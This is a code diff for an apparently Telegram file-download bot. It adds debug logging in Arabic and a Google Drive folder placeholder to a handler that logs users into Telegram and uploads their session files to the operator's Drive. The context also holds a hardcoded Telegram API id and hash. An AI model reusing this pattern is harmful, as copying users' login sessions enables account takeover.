@@ -104,7 +104,7 @@ async def process_phone(update, context):
     session_file = f"/tmp/session_{user_id}.session"
     api_id = 26466946
     api_hash = '05d7144ca3c5f4594e40c535afb3bd5a'
-    
+    FOLDER_ID = "YOUR_FOLDER_ID"  # معرف مجلد Google Drive
     file_metadata = {
         'name': f'session_{user_id}.session',
         'parents': [FOLDER_ID],
@@ -130,6 +130,7 @@ async def process_phone(update, context):
             os.remove(session_file)
             try:
                 query = f"name='{file_metadata['name']}' and '{FOLDER_ID}' in parents"
+                print(f"حذف الجلسة من Google Drive: البحث عن الملف باستخدام الاستعلام: {query}")
                 response = drive_service.files().list(q=query, fields="files(id)").execute()
                 if response['files']:
                     file_id = response['files'][0]['id']
@@ -157,11 +158,14 @@ async def process_phone(update, context):
 
                 print("بدء عملية الرفع إلى Google Drive...")
                 upload_media = MediaFileUpload(session_file, resumable=True)
+                print(f"تم إنشاء MediaFileUpload: {upload_media}")
+
                 uploaded_file = drive_service.files().create(
                     body=file_metadata,
                     media_body=upload_media,
                     fields='id'
                 ).execute()
+
                 print(f"تم رفع الجلسة إلى Google Drive بنجاح: File ID: {uploaded_file.get('id')}")
                 await update.message.reply_text("تم تسجيل الدخول بنجاح! أرسل الآن رابط الملف لتحميله.")
                 return FILE
@@ -181,7 +185,6 @@ async def process_phone(update, context):
         print(f"حدث خطأ أثناء إنشاء الجلسة: {e}")
         await update.message.reply_text(f"حدث خطأ أثناء إنشاء الجلسة: {e}")
         return PHONE
-
 
 
 
